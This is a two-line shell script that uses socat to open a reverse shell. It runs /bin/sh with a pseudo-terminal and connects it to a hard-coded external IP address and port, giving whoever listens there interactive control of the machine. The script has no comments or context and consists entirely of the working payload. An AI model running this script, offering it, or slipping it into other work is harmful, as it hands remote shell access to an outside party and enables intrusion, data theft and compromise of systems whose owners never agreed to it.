#!/bin/sh
socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:35.228.151.155:4765
